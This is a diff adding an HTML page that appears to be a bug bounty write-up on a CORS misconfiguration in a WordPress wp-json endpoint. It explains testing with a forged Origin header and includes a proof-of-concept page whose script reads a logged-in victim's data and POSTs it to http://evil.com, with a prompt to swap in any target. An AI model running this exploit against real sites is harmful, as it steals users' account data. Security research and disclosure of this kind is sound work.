@@ -1,0 +1,90 @@
+<!DOCTYPE html>
+<html>
+	<head>
+		<meta name="viewport" content="width=device-width, initial-scale=1.0">
+		<meta charset="utf-8" />
+		<link rel="stylesheet" type="text/css" href="css/style.css" />
+		<title>CORS Misconfiguration Vulnerabilities</title>
+	</head>
+<body>
+<h1>CORS Misconfiguration Vulnerabilities</h1>
+
+<h2>How I found a CORS misconfiguration in Chime.</h2>
+
+<p><strong> CORS Misconfiguration allows a malicious web page to steal information.</strong></p>
+
+<p><strong>Let’s start by explaining a bit about CORS ( Cross-origin resource sharing).</strong></p>
+
+<p>CORS is a browser mechanism that enables browsers to perform cross domain requests to third party domains.</p>
+
+<p><strong>My Methodology to find. CORS misconfiguration</strong></p>
+
+<p>A lot of times I start by brute forcing filenames and directories as part of my methodology. While scanning I found an wp-json endpoint that was vulnerable to cross misconfiguration.</p>
+
+<p><strong>How can you test for cors misconfiguration?</strong></p>
+
+<ol>
+	<li>Intercept web traffic with Burp Suite</li>
+	<li>Add Origin header like so: Origin: evil.com</li>
+	<li>It will give you a status HTTTP code of 200</li>
+</ol>
+
+<p>What’s a clear indication that this endpoint is vulnerable to this vulnerability? </p>
+
+<p>After you find the vulnerable endpoint, Look for the Origin Header in the request, add evil.com to the header and send the request, if the malicious site reflects in the Access-Control-Allow-Origin header in the response then its vulnerable.</p>
+
+<pre><code>&gt; Access-Control-Allow-Credentials: true
+&gt; Access-Control-Allow-Headers: Authorization, Content-Type
+&gt; Access-Control-Allow-Methods: OPTIONS, GET, POST, PUT, PATCH, DELETE
+&gt; Access-Control-Allow-Origin: http://evil.com
+&gt; Access-Control-Expose-Headers: X-WP-Total, X-WP-TotalPages</code></pre>
+
+<figure><img src="Images/cors.png"/></figure>
+
+<p>You can also built a simple PoC for this vulnerability</p>
+
+<pre><code>&lt;!DOCTYPE html&gt;
+~&lt;html&gt;~
+~&lt;body&gt;~
+~&lt;center&gt;~
+~~&lt;h3&gt;information data leak&lt;/h3&gt;
+~&lt;html&gt;~
+~&lt;body&gt;~
+~&lt;button type=&#39;button&#39; onclick=&#39;cors()&#39;&gt;~Exploit~&lt;/button&gt;~
+~~&lt;p id=&#39;demo&#39;&gt;&lt;/p&gt;
+~~&lt;script&gt;
+~~function cors() {
+~~var xhttp = new XMLHttpRequest();
+~~xhttp.onreadystatechange = function() {
+~~if (this.readyState == 4 &amp;&amp; this.status == 200) {
+~~var a = this.responseText; // Sensitive data from niche.co about user account
+~~document.getElementById(&quot;demo&quot;).innerHTML = a;
+~~xhttp.open(&quot;POST&quot;, &quot;http://evil.com&quot;, true);// Sending that data to Attacker&#39;s website
+~~xhttp.withCredentials = true;
+~~console.log(a);
+~~xhttp.send(&quot;data=&quot;+a);
+~~}
+~~};
+~~xhttp.open(&quot;GET&quot;, &quot;https://target.com/wp-json/&quot;, true);
+~~xhttp.withCredentials = true;
+~~xhttp.send();
+~~}
+~~&lt;/script&gt;
+~&lt;/body&gt;~
+~&lt;/html&gt;~</code></pre>
+
+<p>Just change xhttp.open(&quot;GET&quot;, &quot;https://target.com/wp-json/&quot;, true); to your target.</p>
+
+<p>So what’s the impact of exploiting this vulnerability?</p>
+
+<h2>Impact</h2>
+
+<p>An attacker can embed a malicious site with exploits that will fetch sensitive information from the victim’s site.</p>
+
+<p>This is another solid bug with a decent payout.</p>
+
+<h1>HAPPY HACKING</h1>
+
+</body>
+</html>
+
